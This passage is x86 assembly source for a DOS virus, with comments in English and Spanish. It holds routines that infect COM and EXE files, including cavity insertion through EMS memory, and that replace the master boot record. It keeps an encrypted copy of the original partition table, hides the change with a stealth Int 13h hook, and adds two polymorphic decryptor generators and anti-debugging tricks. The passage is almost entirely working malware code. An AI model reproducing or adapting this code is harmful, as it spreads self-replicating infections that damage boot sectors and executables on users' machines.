   @Non_Exe_Phile:
           inc     bp
           jnz     Infect_Exe
   ;*Final_Check_Ends*

                       ; Inserting possibility

           cmp     word ptr es:[di+11h],07f00h ; 32 Kb max for inserting
           ja      @append                     ; ( 32Kb - 100h bytes for Psp )

           call    EMS_IVT                     ; Check if EMS vector 67h

           jz      @append

           mov     ah,40h                      ; EMS there ?
           int     67h
           or      ah,ah
           jnz     @append

           call    EMS_Get             ; DS = SEGMENT, DX = HANDLE, BX = FHANDLE

           call    push_all_regs

   ; Inserting infection

           mov     dx,100h
           mov     word ptr es:[di+15h],0      ; Load file at ds:0100h
           mov     ah,3fh
           mov     cx,word ptr es:[di+11h]
           call    call_21h

           mov     word ptr cs:[_ip],100h
           mov     word ptr cs:[_cs],ds
           mov     word ptr cs:[_ds],ds
           mov     word ptr cs:[_es],ds
           mov     word ptr cs:[_cx],cx
           call    fuck_the_rules
           xor     ax,ax
           mov     ds,ax
           mov     ah,byte ptr ds:[46ch]
           inc     al                  ; Mode 02 ( checking for instruction
           inc     al                  ;length )
           mov     word ptr cs:[_usemode],ax
           call    code_emulator

           call    pop_all_regs
           push    dx

           mov     ax,word ptr cs:[_ip]
           sub     ax,3h   ; Para ajustar a la posici¢n anterior
           mov     word ptr cs:[ret_pos],ax        ; Return address
           sub     ax,100h
           mov     word ptr es:[di+15h],ax     ; Where to put the jmp
           push    ax
           mov     ah,3fh
           mov     cx,3h
           push    cs      ; innecesario ?
           pop     ds
           lea     dx,buffercom
           call    call_21h
           pop     si          ; SI = Place of inserting


           mov     ax,word ptr es:[di+11h]
           mov     word ptr es:[di+15h],ax
           push    ax
           call    Smack_My_Bitch_UP
           xor     bp,bp
           call    copy_myself

           pop     ax
           sub     ax,si       ; ?
           sub     ax,3
           mov     word ptr cs:[comjmp+1],ax       ; cs: fuera

           mov     word ptr es:[di+15h],si      ; Go to init ( 0 or SI )
           call    Strapping_Young_Lad

           pop     dx
           mov     ah,45h                      ; Free EMS memory
           int     67h

           jmp     @rest_stuff

   @rec_append:
           pop     ax bx
   @append:

           mov     word ptr cs:[ret_pos],0100h

           mov     ax,word ptr es:[di+11h]     ; Jump at init
           mov     word ptr es:[di+15h],ax
           push    ax
           add     ax,200h
           call    Smack_My_Bitch_UP
           mov     bp,1
           call    copy_myself


           pop     ax
           sub     ax,3
           mov     word ptr cs:[comjmp+1],ax

           mov     word ptr es:[di+15h],0      ; Go to init ( 0 or SI )
           call    Strapping_Young_Lad

   @rest_stuff:

           pop     dx cx
           or      cl,1fh          ; New file time
           mov     ax,5701h
           call    call_21h

   rest_attrs:
           pop     ax
           mov     byte ptr es:[di+4h],al      ; Attrib

   @closego:

           mov     ah,3eh
           call    call_21h


   end_infection:

           push    cs
           pop     ds

   trick:
           mov     ax,0cd34h
           add     ax,2beah
           jnc     trick+1
           xor     cx,cx
           sub     al,0b5h
           lea     dx,handler22h
           cmp     word ptr ds:[int21h_plural],cx
           jz      @dontmessitup
           div     cx                  ; AX = 2508h

   @dontmessitup:

           xor     ax,0ffffh
           push    ax
           mov     dx,word ptr cs:[int24h]
           mov     ds,word ptr cs:[int24h+2]

   trick2:
           add     ax,0f1f7h           ; AX = 2524h
           sub     ax,0a7cah
           jnc     trick2+1
                               ; ax = 7d5a ahora

           pop     ax
           mov     si,word ptr cs:[int0h]          ; Looks as if it was anything
           mov     ds,word ptr cs:[int0h+2]        ;of interest in ds:si
   trick3:
           add     ax,0f289h            ; inside -> mov dx,si
           add     ax,02bc0h
           jnc     trick3+1

           div     cx
           jmp     We_finish_here_anyway
   return_point    equ $-2

   ;***********

   EMS_IVT:
           push    ds
           xor     ax,ax
           mov     ds,ax
           mov     ax,word ptr ds:[19ch]       ; Int67h present ? Could hang
           pop     ds                          ;otherwise
           or      ax,ax
           ret

   EMS_Get:

           push    bx                          ; File handle

           mov     ah,41h                      ; Address of the page frame
           int     67h                         ;segment in Bx, where pages are
                                               ;dumped
           push    bx

           mov     ah,43h
           mov     bx,2                        ; Assign 2 pages ( 32 Kb ) for us
           int     67h
           or      ah,ah
           jnz     @rec_append                 ; Dx = EMS Handler

           mov     ax,4400h                    ; Dump the logical page in BX
           mov     bx,0000h                    ;to the physical one in Al
           int     67h

           pop     ds                          ; Segment of EMS: we can start
                                               ;writing on this 32Kb
           pop     bx                          ; Recover handle
           ret


   repeated:       db      0
   coincidences:   dw      0
   reference:      db      0

   Infect_Exe:

           ; With file opened, date stored, etc

           call    EMS_IVT
           jz      Exe_Shit

           cmp     dword ptr es:[di+11h],350000d   ; Maximum
           ja      Exe_Shit

           cmp     word ptr cs:[buffercom+1ah],0          ; Not-overlays
           jnz     Exe_Shit

           mov     ah,40h                      ; EMS  ?
           int     67h
           or      ah,ah
           jnz     Exe_Shit

           call    EMS_Get
           mov     byte ptr cs:[reference],-1

           push    dx

   Read_16Kb:
           inc     byte ptr cs:[reference]
           xor     dx,dx
           mov     ah,3fh
           mov     cx,04000h
           div     dx
           cmp     cx,ax
           jnz     @Free_Ems
           xor     si,si
   Get_byte:
           lodsb
           cmp     byte ptr cs:[repeated],al
           jz      @add_1_to
           mov     byte ptr cs:[repeated],al
           mov     word ptr cs:[coincidences],0
   @add_1_to:
           inc     word ptr cs:[coincidences]
           cmp     word ptr cs:[coincidences],virus_size
           jz      @CavityRulez

           cmp     si,4000h
           jnae    Get_Byte
           jmp     Read_16Kb

   @CavityRulez:

           xor     ax,ax
           mov     al,byte ptr [reference]
           mov     dx,4000h
           mul     dx                      ; DX:AX is tha shit
           add     ax,si                   ; Offset on this one
           adc     dx,0                    ; Adjust dx
           sub     ax,(virus_size-01ch)    ; Real offset
           sbb     dx,0                    ; Adjust dx

           push    ax dx          ; Start en fichero
           pop     ax
           rol     eax,16d
           pop     ax              ; EAX = DXAX
           mov     dx,word ptr cs:[buffercom+8h]
           rol     dx,4d           ; ( paragraphs )
           mov     dword ptr es:[di+15h],eax

           push    ax
           sub     ax,dx
           add     ax,100h
           mov     si,ax
           call    Smack_My_Bitch_UP

           pop     ax

           mov     bp,1
           call    copy_myself

           sub     ax,dx
           rol     eax,16d
           sbb     ax,0h
           rol     eax,16d
           mov     dword ptr cs:[buffercom+14h],eax
           push    cs
           pop     ds
           lea     dx,buffercom
           mov     cx,1ch
           xor     ebp,ebp
           mov     dword ptr es:[di+15h],ebp
           mov     ah,40h
           div     bp


   @Free_Ems:

           pop     dx                  ; EMS Handle
           mov     ah,45h                      ; Free EMS memory
           int     67h

           ; Parte final com£n:
   Exe_Shit:

           jmp     @rest_stuff

   ;ú--úú-úú-ú-úúú-ú--ú-ú-úú--ú--ú-úú-ú-úú-úú-ú-ú-úú-úú-ú--ú-úú-ú--ú-úú-ú-úú-ú-ú
   ;                             Int 8h handler
   ;-ú--ú-ú-úú-ú-úúú--úúú-ú--ú--ú-ú--ú-ú-ú--úú-ú-úú--úú-ú-úúú-ú-ú-ú-ú--ú-úúú-ú-ú

   db      'I''m Ithaqua,... that who walks over the wind',0

   handler22h:

           call    push_all_regs

           mov     ds,word ptr cs:[Swap_seg]
           mov     si,word ptr cs:[Swap_off]
           lodsw               ; ah=INDOS flag
           or      ax,ax
           jnz     go_away
           mov     al,byte ptr cs:[InVirus]
           or      al,al
           jnz     go_away

           cld
           push    cs                  ; So, we recover the jump.
           pop     ds
           mov     es,word ptr ds:[jump_handle+2]
           mov     di,word ptr ds:[jump_handle]
           lea     si,saved21
           movsd
           movsb

           xor     ax,ax
           mov     ds,ax
           db      0a0h,06ch,04h   ; mov al,[46ch]
           and     al,11b
           cmp     al,3d
           jnz     betta_dan_be4
           dec     al
   betta_dan_be4:
           rol     ax,2

           mov     si,offset int21h_plural
           add     si,ax

           mov     dx,word ptr cs:[si]
           mov     ds,word ptr cs:[si+2]
           mov     word ptr cs:[jump_handle],dx
           mov     word ptr cs:[jump_handle+2],ds
           push    cs dx               ; We save real instructions
           pop     si es
           lea     di,saved21
           movsd
           movsb

           call    rehandle

   go_away:

           call    pop_all_regs

           db      0eah
   int8h:  dw      0,0


   ;-ú--ú-ú--ú-ú--úú-úú-ú--ú-úú-ú--ú-ú--ú-ú--ú-úú-ú--ú--úú-ú-úú-úú-ú--úú-ú--ú-
   ;                               MBR Stuff
   ;-ú--ú-ú--ú-ú--úú-úú-ú--ú-úú-ú--ú-ú--ú-ú--ú-úú-ú--ú--úú-ú-úú-úú-ú--úú-ú-úú-
   ;
   ;   Aquel que se rompe los dientes con la c scara raramente come la
   ; almendra.
   ;
   ;

   MBR_start label byte

   MBR_real_start:

           cli
           db      (512d-(boot_up_end-MBR_bootup)+1) dup (90h)

   MBR_Bootup:

           cli
           xor     ax,ax
           mov     ss,ax
           mov     sp,7c00h
           sti

           mov     si,sp

           mov     ds,ax
           dec     word ptr ds:[413h]
           int     12h
           shl     ax,6d
           mov     es,ax

           xor     di,di
           mov     cx,512d
           rep     movsb
           push    es
           push    offset Sector_3-(MBR_Start-Virus_starts)
           retf

   Sector_3:           ; Ok, we are now outta that 7c00h...

   Int13h_relo equ int13h-(MBR_start-virus_starts)

           xor     ax,ax
           mov     ds,ax
           mov     si,004ch
           lea     di,Int13h_relo
           movsw           ; movsd
           movsw

                           ; Relocate int 13h jump

           mov     word ptr cs:[cal-(MBR_start-virus_starts)],offset Int13h_relo


           cli
           mov     word ptr ds:[004ch],offset (Int13_h-(MBR_start-virus_starts))
           mov     ax,cs
           mov     word ptr ds:[004eh],ax      ; Set new int13h
           sti

           mov     dl,80h
           int     19h                         ; Boot: stealth will do


   Int13_h:                ; Int13h handler

           cmp     eax,"_POT"
           jz      @Dissapear
           cmp     ah,02h
           jz      Stealth_read
   jmpto:  db      0eah
   Int13h: dw      0,0

           ret

   call13h:
           pushf
           call    dword ptr cs:[int13h]
   cal     equ     $-2
           ret

   @Dissapear:
           mov     eax,"ALSO"                  ; %-)
           push    dx cx
           retf

   Stealth_read:
           cmp     dx,0080h
           jnz     jmpto
           cmp     cx,1
           jne     jmpto

           call    call13h         ; Make read

           push    si ax cx
           mov     ax,0201h
           mov     cl,2h
           call    call13h         ; First sector read is now partition table.

           mov     cx,512d
           mov     si,bx
           mov     al,0
   Part_enc    equ $-1

   Decrypt_MBR:
           xor     byte ptr es:[si],al
           inc     si
           loop    Decrypt_MBR
           pop     cx ax si;

           retf    2               ; Return to host

   Stupid_message:
           db      'Welcome to my world, adventurer. Follow me.'


   Boot_up_end     label byte
           db      055h,0aah

   ; END OF MBR SECTOR



   MBR_Infection:              ; ES is set to old copy in file/mem
                               ; BX is set then to the MBR_start there

           mov     dx,0281h
           mov     ax,dx
           xor     cx,cx
           add     bx,offset MBR_start
           mov     si,bx
           add     ax,0ff80h
           xor     dx,ax
           inc     cx
           int     13h
           jc      Abort_MBR

           in      al,40h
           mov     cx,512d
           push    cx
           mov     byte ptr cs:[Part_enc],al
   Encrypt_MBR:
           xor     byte ptr es:[si],al
           inc     si
           loop    Encrypt_MBR

           pop     cx
           sub     cx,510d
           mov     ax,dx
           add     ax,282h                 ; Save MBR in sector two
           int     13h
           jc      Abort_MBR

           push    dx

           call    GROG                ; Gory Ruthless Opcode Generator

           pop     dx
           mov     ax,1
           mov     cx,ax
           lea     bx,MBR_start       ; Write new MBR and fuck up old one
           sub     ax,0fd00h
           int     13h
           jc      Abort_MBR

           lea     di,MBR_Bootup           ; Optimizar
           lea     si,_stack
           mov     cx,Boot_up_end-MBR_Bootup
           rep     movsb

           mov     ds,cx                   ; ds = 0
           mov     si,4ch
           lea     di,int13h
           movsw
           movsw

           cli
           mov     word ptr ds:[004ch],offset Int13_h
           mov     ax,cs
           mov     word ptr ds:[004eh],ax      ; Set new int13h
           sti



   Abort_MBR:

           ret



   MBR_end label byte
   MBR_module_size equ MBR_end-MBR_start


   ;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)
   ;(*                  Gory Ruthless Opcode Generator [GROG]                 *)
   ;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)
   ;
   ;
   ;
   ; Parameters:
   ;
   ;   DX = Decryptor length
   ;   ES:DI = Buffer to make decryptor ( followed by boot-up code )
   ;   DS:SI = Going-to-crypt code
   ;   CX = Length of encrypted zone
   ;
   ;
   ;

   GROG:

           push    cs cs
           pop     ds es
           lea     si,MBR_Bootup
           lea     di,_stack
           mov     cx,Boot_up_end-MBR_Bootup
           rep     movsb



           lea     di,MBR_Real_Start+151d
   dec_1_length equ 512d-(boot_up_end-MBR_bootup)
           lea     si,MBR_Bootup
           mov     cx,Boot_up_end-MBR_Bootup
           mov     word ptr cs:[boot_decr_offset],offset boot_decr_inst
           mov     byte ptr cs:[do_crypt_inst],05h
           mov     byte ptr cs:[remaining],dec_1_length-153d
           mov     word ptr cs:[@place_to],07c00h+(dec_1_length-(02d))

           push    di ds
           call    real_poly
           pop     ds si

           lea     di,MBR_real_start+1
           mov     cx,512d-153d

           mov     word ptr cs:[boot_decr_offset],offset boot_decr_inst
           mov     byte ptr cs:[do_crypt_inst],05h
           mov     byte ptr cs:[remaining],150d
           mov     word ptr cs:[@place_to],7c00h+151d
           call    real_poly

           ret

   ;*-*-*-*-*-*-*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*-*-*-*-*-*-*-
   ;*-*-*-*-*-*-*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*-*-*-*-*-*-*-


   real_poly:

       ; First of all, encrypt.

   encrypt:
           push    cx
           xor     bx,bx
           xor     ax,ax
           in      al,40h
           mov     cl,3
           div     cl
           add     bl,ah
           xor     ax,ax
           add     bx,offset crypts
           xlat
           mov     byte ptr cs:[Encrypt_kind],al  ; Al has the byte which
                                           ;determines kind of encryption
           sub     al,4
           cmp     al,30h              ; Select which decryption to use
           jz      do_cryptor_b
           xor     al,28h              ; Swap add/sub
   do_cryptor_b:
           pop     cx
           mov     byte ptr cs:[mode],al

           in      al,40h
           mov     byte ptr cs:[Crypt_value],al
   do_cryptor:
           db      02eh                ; cs:
   mode:   db      30h,04h             ; xor [si],al

           inc     si
           loop    do_cryptor

   ;***************************************************************************
   ;                      Finished crypting. Fun starts :)
   ;***************************************************************************

   @switchSiDi:                    ; Switches SI and DI in decryptor
           mov     bl,2
           div     bl
           dec     ah
           mov     bl,0beh
           jz      @switch
           inc     byte ptr cs:[encrypt_kind]
           inc     bl

   @switch:
           mov     byte ptr cs:[boot_decr_inst],bl
           sub     bl,78h      ; inc si=46h, di=47h
           mov     byte ptr cs:[Incer],bl
           sub     bl,0ah      ; si=3ch, di=3dh
           mov     byte ptr cs:[SiInCmp],bl

           push    cs
           pop     ds
           in      al,40h              ; Random
           push    ax                  ; fix


   ;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)
   ;(*                       Main Polymorphic engine                          *)
   ;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)

   Main_poly:                      ; ES:DI where to put it

           pop     ax                  ; Fix the push before
           mov     bl,6d               ; kinda instructions
           call    get_random          ; => bl limit, number before
                                   ; => bx random number

       ; Go to instruction kind depending on table

           push    ax
           mov     dl,byte ptr cs:[remaining]

           mov     al,byte ptr cs:[do_crypt_inst]
           cbw                                 ; force decryptor if necessary
           div     dl
           cmp     al,22d              ; for 150d
           ja      @Non_need_to_force
           cmp     byte ptr cs:[do_crypt_inst],1
           jz      @Non_need_to_force

           xor     ax,ax

   @Non_need_to_force:

           cmp     dl,04h
           ja      @Non_ending
           xor     bx,bx
           dec     dl
           jz      @Make_us_one
           dec     dl
           jz      @Make_us_two
           dec     dl
           jz      @Make_us_three
   @Make_us_four:
           inc     bl
   @Make_us_two:
           inc     bl
   @Make_us_three:
           inc     bl
           inc     bl
   @Make_us_one:
           inc     bl
   @Non_ending:
           lea     si,generator_table1
           shl     bx,1
           add     si,bx               ; Points to an instruction kind
           lodsw                       ; Al, number of table entries
           mov     si,ax

       ; We've got in SI the InstructionKind table beggining offset

           lodsb                       ; Number of bytes
           mov     bl,al               ; Now in bl ( limit )
           pop     ax
           call    get_random          ; Gets another random number
           push    ax bx               ;for non-losing the number in the table
                                       ;and have last random in the beggining
           lodsb                       ; fixed block instructions length
           or      al,al               ; 0h tells decryptor instructions
           jz      Make_decryptor_inst
           mov     byte ptr cs:[random_make],0h    ; Initialize random_make
           inc     al
           jnz     @No_parameters
           lodsb                       ; random number length
           mov     byte ptr cs:[random_make],al    ; In random_make
           lodsb
           inc     al                  ; Fix

   @No_parameters:
           dec     al
           xor     cx,cx
           add     cl,al               ; To see how many bytes will copy
           pop     bx                  ; BX = instr number, CX = number of bytes
           push    cx

   @add_cx:
           add     si,bx               ; Now it has an instruction kind caught
           loop    @add_cx             ;in DS:SI
           pop     cx                  ; And CX is it's bytes number
           sub     byte ptr cs:[remaining],cl  ; Subs the number of copied bytes
           rep     movsb

           xor     cx,cx
           mov     cl,byte ptr cs:[random_make]
           or      cl,cl
           jz      @non_random_use
           pop     ax
           mov     bx,0abcdh
           add     ax,bx
           ror     ax,4h
           call    get_random          ; Random number in AX for instruction
           push    ax

   @Store_random:
           stosb
           dec     byte ptr cs:[remaining]
           mov     al,ah
           loop    @Store_random

   @non_random_use:

           cmp     byte ptr cs:[remaining],0
           jz      @@finished

           jmp     Main_poly

   ;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)
   ;                     Makes a decryptor instruction on it
   ;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)

   Make_decryptor_inst:
           pop     bx
           dec     si
           dec     si
           push    si
           dec     byte ptr cs:[si]
           lodsb
           jz      @no_more_dec          ; 5:4:3:2:1 -> 6§ change ( =1 ), bye

           cmp     al,03h              ; Check to make correct jnz
           jnz     @non_op_dec         ;storing the relative offset
           mov     dl,byte ptr cs:[remaining]
           add     dl,7d
           mov     byte ptr cs:[offset_codify],dl

   @non_op_dec:

           cmp     al,01h
           jnz     @non_jnz
           mov     dl,00h
           sub     dl,byte ptr cs:[offset_codify]
           add     dl,byte ptr cs:[remaining]
           mov     byte ptr cs:[Where_junz],dl


   @non_jnz:
           pop     bx          ; Fix
           inc     si          ; We make it point where we need, beginning bytes
           mov     bx,4d
           xor     ah,ah
           sub     bl,al
           add     si,bx               ; Position in bytes number
           lodsb                       ;AL number of bytes
           mov     si,word ptr cs:[boot_decr_offset]   ; instruction to send
           xor     cx,cx
           mov     cl,al               ; times to write
           add     word ptr cs:[boot_decr_offset],cx
           sub     byte ptr cs:[remaining],cl
           rep     movsb               ; copy the instruction

           cmp     byte ptr cs:[remaining],0
           jnz     @dece

   @@finished:
           pop     ax
           ret

   @no_more_dec:
           pop     si
           inc     byte ptr cs:[si]
   @dece:
           jmp     Main_Poly

   ; XOR BYTE PTR [XXXX],YY        80 36 XX XX YY
   ; SUB BYTE PTR [XXXX],YY        80 2E XX XX YY   xor 28h
   ; ADD BYTE PTR [XXXX],YY        80 06 XX XX YY

   generator_table1:
           dw      offset do_crypt_inst
           dw      offset do_operation_one_byte
           dw      offset do_push_pop
           dw      offset do_operation_random_bytes
           dw      offset do_operation_two_random
           dw      do_operation_two_two

   do_crypt_inst:
           db      04h             ; Decryptor instruction number
           db      00h             ; Decryptor instruction kind
           db      03h,04h,01h,07h ; lengths

   do_operation_one_byte:
           db      end_1_byte-do_operation_one_byte-(02d)
           db      01h

           db      41h,42h,43h,44h,45h          ; (incs) CX DX BX SP BP
           db      49h,4ah,4bh,4ch,4dh             ; (dec) CX DX BX SP BP
           db      90h             ; NOP
           db      99h             ; CWD
           db      0f8h            ; CLC
           db      0f9h            ; STC

   end_1_byte label byte

   do_push_pop:
           db      end_pushpop-do_push_pop-(02d)
           db      01h
           db      07h,017h,01fh             ; POP
           db      59h,5ah
           db      5bh,5ch,5dh
   end_pushpop label byte

   do_operation_random_bytes:
           db      end_3_bytes-do_operation_random_bytes-(04d)
           db      0ffh            ; Register use
           db      02h             ; Random number length
           db      01h             ; Quantity of opcodes to copy from the table
           db      0a9h            ; Test ax,xxxx
           db      0b9h,0bah,0bbh,0bch,0bdh
                               ; Mov Cx,xxxx... Dx,Bx,Sp,Bp
   end_3_bytes label byte

   do_operation_two_random:
           db      end_2_rnd-do_operation_two_random-(04d)
           db      0ffh            ; Needs number
           db      01h             ; Random length
           db      01h             ; Number of opcodes
           db      0a8h            ; test al,xx
           db      0b1h,0b2h,0b3h,0b5h,0b6h,0b7h ;mov: cl dl bl ch dh bh
   end_2_rnd label byte

   do_operation_two_two:
           db      (end_two_two-do_operation_two_two)/2-(04d)
           db      0ffh            ; Needs number
           db      02h             ; Random
           db      02h             ; Opcodes
           db      08bh,01eh,08bh,02eh,08bh,0eh,08bh,09eh,08bh,0aeh  ; mov reg,mem
           db      08bh,026h,08bh,016h
   end_two_two label byte

   crypts:
           db      34h,2ch,04h       ; Last, kinda encryption
   boot_decr_offset:
           dw  offset boot_decr_inst
   remaining:
           db      ?
   offset_codify:
           db  ?

   boot_decr_inst:     ; Can't touch SI, AX

   ;   New example:
   ;

               mov     si,07c00h+512d-(boot_up_end-MBR_bootup)-2;200d+100h      ; 1 byte instr, dos dir
   @place_to   equ $-2
           db      02eh        ; CS:
           db      80h
           db      34h          ; Style ( with SI and AL )
           db      00h          ; Encryption value
    Crypt_value equ $-1
    Encrypt_kind equ $-2
    Looping_Crypt equ $-3
    Incer equ $
           inc     si
           db      02eh    ;cs:
           cmp     word ptr [si],0AA55h          ; 55AAh
    SiInCmp equ $-3        ; 3ch SI 3dh DI
           jnz     Looping_Crypt
    Where_junz equ $-1
   ;

   Random_make:
           db  0
   get_random:

           ror     ax,5h
           xor     ax,0ddddh
   @Xor_random     equ     $-2
           push    ds
           push    0
           pop     ds
           add     al,byte ptr ds:[413h]
           pop     ds
           add     word ptr cs:[@Xor_random],ax
           sub     ax,51h
           push    ax
           xor     ah,ah
           div     bl
           xor     bx,bx
           mov     bl,ah               ; Pointer to tables
           pop     ax
           ret



   ;   Takhisis was known also as having a lot of faces, and that's the way
   ; the children and the mad, the only brave enough to pronounce her name,
   ; called her at Hylo.
   ;


   RNME:

                   ; The very first thingie is deciding if it will be xor, add
                   ;or sub

                   ; loop_dec + 2
                   ; crypt_file
           push    cx
           mov     cl,30h
           call    aleatorio
           and     al,1
           jz      @crypt_with_xor
           mov     cl,00h
           and     ah,1
           jz      @crypt_with_xor
           xor     cl,28h

   @crypt_with_xor:
           mov     byte ptr [crypt_file],cl
           cmp     cl,30h
           jz      @no_cambiar_crypt
           xor     cl,28h

   @no_cambiar_crypt:
           add     cl,5
           mov     byte ptr [instrucciones+0ch],cl
           pop     cx

                   ; Dx = Bp = start_crypt
                   ; Cx = encryption length

           mov     word ptr [instrucciones+0fh],0e247h     ; inc di/loop

           in      al,40h
           mov     byte ptr [encrypt_val],al

   crypt_file:
           xor     byte ptr [bp],al
           inc     bp
           loop    crypt_file


           mov     byte ptr [instrucciones+05h],0b9h   ; mov cx,xxxx
           mov     byte ptr [reentrant_flag],0
           mov     word ptr [bytes_referencia],0h
           mov     word ptr [restantes_poly],200h   ; n.instr decryptor
           mov     byte ptr [numero_instruccion],4h ; n.util instrs

     ; This first part of the poly engine fills the blanks of the four blocks
     ;with random instructions



           lea     di,instrucciones+3h;Instruct_new+3h
   two_times:
           call    aleatorio
           and     ah,1
           jz      two_of_one
           call    inst_2
           jmp     next_inst_gen

   two_of_one:
           call    inst_1
           inc     di
           call    inst_1

   next_inst_gen:
           cmp     di,( offset instrucciones+08h )
           jae     @di0dh
           lea     di,Instrucciones+08h
           jmp     two_times
   @di0dh:
           cmp     di,( offset Instrucciones+12h )
           ja      @end_filling
           lea     di,Instrucciones+0eh
           call    inst_1
           lea     di,Instrucciones+12h
           jmp     two_times

   @end_filling:



     ; This part exchanges 50% times Si and Di registers, which are used in
     ;the decryptor instructions


           call    aleatorio
           and     ah,1
           mov     byte ptr [instrucciones],0bfh
           jz      dontchangeem
           mov     byte ptr [instrucciones],0beh
           dec     byte ptr [instrucciones+0ch]        ; encriptaci¢n

           mov     byte ptr [instrucciones+0fh],046h   ; Para el Inc


   dontchangeem:


     ; Depending on a random value, cx is obtained by the normal way ( mov cx, )
     ; or with a mov dx, register, mov cx,dx

           call    aleatorio
           and     ah,1
           jz      cx_acabado
           cbw
           and     ah,1
           jz      siguiente_abajo
           and     al,1
           jz      con_bp_cx
           mov     byte ptr [instrucciones+05h],0bbh       ; mov bx,xxxx
           mov     word ptr [instrucciones+08h],0d989h     ; mov cx,bx
           jmp     cx_acabado
   con_bp_cx:
           mov     byte ptr [instrucciones+05h],0bdh       ; mov bp,xxxx
           mov     word ptr [instrucciones+08h],0e989h     ; mov cx,bp
   siguiente_abajo:
           and     al,1
           jz      cx_con_dx
           mov     byte ptr [instrucciones+05h],0b8h       ; mov ax,xxxx
           mov     word ptr [instrucciones+08h],0c189h     ; mov cx,ax
           jmp     cx_acabado
   cx_con_dx:
           mov     byte ptr [instrucciones+05h],0bah       ; mov dx,xxxx
           mov     word ptr [instrucciones+08h],0d189h     ; mov cx,dx
   cx_acabado:

     ; The modification of the instructions of the decryptor finishes here with
     ;all changes made: the originals are kept at the beggining of the virus in
     ;memory. The posible 'final loop' exchange is made when writing the
     ;decryptor

     ; Here begins the main zone of the code generator; where it's decided
     ;what generator to use and random instructions are copied at the
     ;decryptor.


           mov     di,virus_size+1
   centro_poly:
           mov     ax,word ptr [restantes_poly]    ; Remaining
           mov     cx,ax                           ;instructions number
           and     cx,cx
           jnz     sigamos_decriptor
           jmp     acabamos_decryptor      ; Checks if finished
   sigamos_decriptor:
           cmp     cx,@End_ant-ant_debug
           jae     @cont_decrr
           cmp     byte ptr [numero_instruccion],1
           jz      @@call_decryptgen
   @cont_decrr:                        ; If we have 1, 2 or 3 bytes remaining
           dec     cx
           jz      @@call_inst_1
           dec     cx
           jz      @@call_inst_2
           dec     cx
           jz      @@call_inst_3

           mov     cx,80h      ; 200h / 80h = 4
           div     cl
           inc     al
           cmp     byte ptr [numero_instruccion],al
           ja      @@call_decryptgen

           cmp     byte ptr[numero_instruccion],1
           jnz     @continuemos        ; To avoid the loop from going
           mov     ax,di               ;out of range
           sub     ax,word ptr [loop_site]
           cmp     ax,70h
           jae     @@call_decryptgen
           cmp     byte ptr [restantes_poly],10d
           jbe     @@call_decryptgen

   @continuemos:
           call    aleatorio           ; randomly, place 3 bytes instr,
           and     ah,1                ;2, routine...
           jz      @@trestipos
           and     al,1
           jz      @@call_inst_4
   @@call_inst_1:
           call    inst_1
           dec     word ptr [restantes_poly]
           inc     di
           jmp     centro_poly
   @@call_inst_4:
           call    inst_4
           add     di,4
           sub     word ptr [restantes_poly],4
           jmp     centro_poly

   @@trestipos:
           cbw
           and     ah,1
           jz      @@inst_2odec
           and     al,11b
           jz      @@call_sub
   @@call_inst_3:
           call    inst_3
           add     di,3
           sub     word ptr[restantes_poly],3
           jmp     centro_poly
   @@inst_2odec:
           and     al,111b     ; Low probability
           jnz     @@call_inst_2
   @@call_decryptgen:
           call    gen_instruction
           jmp     centro_poly
   @@call_inst_2:
           call    inst_2
           inc     di
           sub     word ptr[restantes_poly],2
   @fix1:
           jmp     centro_poly
   @@call_sub:
           cmp     word ptr[restantes_poly],@End_ant-ant_debug
           jb      @fix1
           call    inst_5
           add     di,si
           sub     word ptr[restantes_poly],si  ; Long non fixed size
           jmp     centro_poly             ;routine


   acabamos_decryptor:
           ret


   instrsize       equ     instr_end-instr_start

   instr_start     label byte

     ; Decryptor instructions list; divided into five-bytes blocks.

   instrucciones:

           mov     di,0200h
   Another_BP      equ     $-2
           db      90h,90h         ; variable ( junk gen )
   ;5
           mov     cx,virus_size
           db      90h,90h

   ;A
   loop_dec:
           xor     byte ptr cs:[di],00d
   encrypt_val     equ     $-1
           db      90h
   ;F
           inc     di
           loop    loop_dec
           db      90h,90h


   instr_end       label byte

   ;*******************************************
   ;               Decryptor values and data
   ;--------------------

   Restantes_poly:     dw 200h         ; Remaining instructions counter
   Numero_instruccion: db 4            ; Instruction number
   num_aleat:          dw 1250h        ; Aleatory number counter
   variable_inst:      db 7h           ; 0111b
   loop_site:          dw 0h           ; Looping allocation Offset
   bytes_referencia:   dw 0h           ; Reference for instructions


     ; This returns a random number in Ax after making some operations.

   aleatorio:
           mov     ax,word ptr[num_aleat]
           call    aleat2
   aleat2:
           ror     ax,5          ; The seed number is stablished in each
           add     ax,1531h      ;infection by the date, and modified
